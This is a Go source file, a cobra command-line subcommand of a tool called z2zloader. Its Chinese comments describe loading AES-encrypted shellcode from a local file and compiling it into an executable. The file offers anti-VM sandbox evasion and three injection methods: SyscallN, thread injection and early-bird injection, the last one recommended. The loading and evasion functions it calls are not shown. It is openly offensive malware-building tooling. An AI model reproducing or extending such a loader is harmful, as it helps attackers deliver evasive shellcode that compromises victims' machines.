/*
Copyright © 2024 NAME HERE <EMAIL ADDRESS>
*/
package cmd

import (
	"fmt"
	"github.com/spf13/cobra"
	"log"
	"z2zloader/tools"
)

// localCmd represents the local command
var localCmd = &cobra.Command{
	Use:   "local",
	Short: "本地加载shellcode",
	Long: `执行本地加密过的aes-shellcode   For example:
.\z2zloader local -f file_path -m 1`,
	Run: func(cmd *cobra.Command, args []string) {
		sandbox, _ := rootCmd.PersistentFlags().GetBool("sandbox")
		fp, _ := cmd.Flags().GetString("file")
		module, _ := cmd.Flags().GetInt("module")
		outputname, _ := cmd.Flags().GetString("output")
		fmt.Println("调用本地加载模块")
		if sandbox {
			tools.CreateGoFile("z2z.go", outputname, fmt.Sprintf("tools.AntiVM()"+"\n\t"+"tools.Local_loader(\"%v\",%d)", fp, module))
		} else {
			tools.CreateGoFile("z2z.go", outputname, fmt.Sprintf("tools.Local_loader(\"%v\",%d)", fp, module))
		}
		log.Println("本地生成exe文件成功")
	},
}

func init() {
	rootCmd.AddCommand(localCmd)
	localCmd.Flags().StringP("file", "f", "", "加载本地shellcode文件,请用类似\"E:\\test\\shellcode\\output.bin\"的格式插入")
	localCmd.Flags().IntP("module", "m", 1, "选择shellcode加载方式,1为SyscallN执行,2为线程注入,3为earybirl注入，推荐使用3")
	localCmd.MarkFlagRequired("file")
	localCmd.Flags().StringP("output", "o", "z2z.exe", "输出文件的名字")
	// localCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
}
